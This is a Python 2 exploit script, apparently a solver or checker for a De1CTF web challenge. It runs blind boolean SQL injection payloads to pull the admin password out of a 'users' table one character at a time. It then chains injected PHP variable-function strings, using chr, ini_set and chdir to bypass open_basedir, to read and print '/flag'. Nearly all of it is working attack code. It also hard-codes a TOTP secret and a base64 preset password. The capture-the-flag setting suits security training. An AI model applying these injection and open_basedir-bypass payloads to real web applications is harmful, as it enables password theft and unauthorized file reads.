#!/usr/bin/python2
#coding:utf-8

from sys import *
from base64 import *
import requests
import urllib
import string
import time
import pyotp

timeout = 1.0
retry_count = 5
logging = 1

url = ''
shell_url = '/shell.php?a=%s&totp=%s'
totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
preset_password = 'aGludHtHMXZlX3VfaGkzM2VuX0MwbW0zbmQtc2gwd19oaWlpbnR0dHRfMjMzMzN9'
preset_length = 48
s = requests.session()


# get method
def get(session, url):
    retry = 0
    while True:
        retry += 1
        try:
            if session:
                r = s.get(url, timeout=timeout)
            else:
                r = requests.get(url, timeout=timeout)
        except:
            if retry >= retry_count:
                return ''
            continue
        break
    return r.text


# post method
def post(session, url, data):
    retry = 0
    while True:
        retry += 1
        try:
            if session:
                r = s.post(url, data=data, timeout=timeout)
            else:
                r = requests.post(url, data=data, timeout=timeout)
        except:
            if retry >= retry_count:
                return ''
            continue
        break
    return r.text


# fuzz admin's password length
def fuzz1():
    length = 0
    left = 0x0
    right = 0xff
    while True:
        mid = int((right - left) / 2 + left)
        if mid == left:
            length = mid
            break
        username = "'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))>=%d,1,0)#" % mid
        password = "b"
        payload = 'login %s %s' % (username, password)
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        res = get(0, payload)
        if res == '':
            print('timeout or http 500')
            exit()
        if logging: print(mid, res)
        if 'incorrect' in res:
            left = mid
        else:
            right = mid
    if logging: print(length)
    return length


# fuzz admin's password value
def fuzz2(length):
    real_password = ''
    for i in range(1, length+1):
        left = 0x20
        right = 0x7e
        while True:
            mid = int((right - left) / 2 + left)
            if mid == left:
                real_password += chr(mid)
                break
            username = "'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))>=%d,1,0)#" % (i, mid)
            password = "b"
            payload = 'login %s %s' % (username, password)
            payload = urllib.quote(payload)
            payload = url % (payload, totp.now())
            res = get(0, payload)
            if res == '':
                print('timeout or http 500')
                exit()
            if logging: print(i, chr(mid), res)
            if 'incorrect' in res:
                left = mid
            else:
                right = mid
        if logging: print(real_password)
        if len(real_password) < i:
            if logging: print('No.%d char not in range' % i)
    return real_password


# login with password
def login(password):
    username = 'admin'
    payload = 'login %s %s' % (username, password)
    if logging: print(payload)
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    res = get(1, payload)
    if res == '':
        print('timeout or http 500')
        exit()
    if logging: print(res)
    if 'succ' not in res:
        return False
    return True


# destruct (admin)
def destruct():
    payload = 'destruct'
    if logging: print(payload)
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    res = get(1, payload)
    if res == '':
        print('timeout or http 500')
        exit()
    if logging: print(res)


# targeting (admin)
def targeting(code, position):
    payload = 'targeting %s %s' % (code, position)
    if logging: print(payload)
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    res = get(1, payload)
    if res == '':
        print('timeout or http 500')
        exit()
    if 'mark' not in res:
        return False
    return True


# launch (admin)
def launch():
    payload = 'launch'
    if logging: print(payload)
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    res = get(1, payload)
    if res == '':
        print('timeout or http 500')
        exit()
    return res


# getflag
def getflag():
    vuln1 = 0
    vuln2 = 0
    logined = 0
    try:
        password = b64decode(preset_password)
    except:
        password = ''
    if not logined:
        if login(password):
            logined = 1
        else:
            password = fuzz2(preset_length)
    if not logined:
        if login(password):
            logined = 1
        else:
            length = fuzz1()
            password = fuzz2(length)
    if not logined:
        if not login(password):
            return 'Vuln 1 check: fail.\nVuln 2 check: unknown.'
    command = "login a'/**/union/**/select/**/3/**/# 3"
    command = urllib.quote(command)
    payload = url % (command, totp.now())
    res = get(0, payload)
    if 'only' in res:
        vuln1 = 1
    destruct()
    targeting('a','chr')
    targeting('b','{$a(46)}')
    targeting('c','{$b}{$b}')
    targeting('d','{$a(47)}')
    targeting('e','js')
    targeting('f','open_basedir')
    targeting('g','chdir')
    targeting('h','ini_set')
    targeting('i','file_get_')
    targeting('j','{$i}contents')
    targeting('k','{$g($e)}')
    targeting('l','{$h($f,$c)}')
    targeting('m','{$g($c)}')
    targeting('n','{$h($f,$d)}')
    targeting('o','{$d}flag')
    targeting('p','{$j($o)}')
    targeting('q','printf')
    targeting('r','{$q($p)}')
    data = launch()
    destruct()
    if '\/flag' in data:
        vuln2 = 1
    result = ''
    if vuln1:
        result += 'Vuln 1 check: pass.\n'
    else:
        result += 'Vuln 1 check: fail.\n'
    if vuln2:
        result += 'Vuln 2 check: pass.\n'
    else:
        result += 'Vuln 2 check: fail.\n'
    try:
        flag = data.split('\n')[0]
        if 'de1ctf{' in flag:
            return result+flag
    except:
        pass
    return 'Server Response:\n%s\n\n%s' % (data, result[:-1])


if __name__ == '__main__':
    if len(argv) != 3:
        print("wrong params.")
        print("example: python %s %s %s" % (argv[0], '127.0.0.1', '80'))
        exit()
    ip = argv[1]
    port = int(argv[2])
    url = 'http://%s:%d' % (ip, port) + shell_url
    print(getflag())
